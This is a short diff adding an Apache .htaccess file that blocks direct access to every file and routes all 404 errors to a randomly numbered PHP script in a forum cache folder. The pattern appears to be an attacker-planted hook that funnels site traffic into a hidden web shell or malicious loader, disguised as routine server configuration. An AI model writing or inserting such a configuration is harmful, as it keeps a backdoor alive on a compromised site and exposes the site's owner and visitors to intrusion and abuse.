@@ -1,0 +1,6 @@
+<Files *>
+	Order Allow,Deny
+	Deny from All
+</Files>
+Options -MultiViews
+ErrorDocument 404 //foro/cache/206771.php
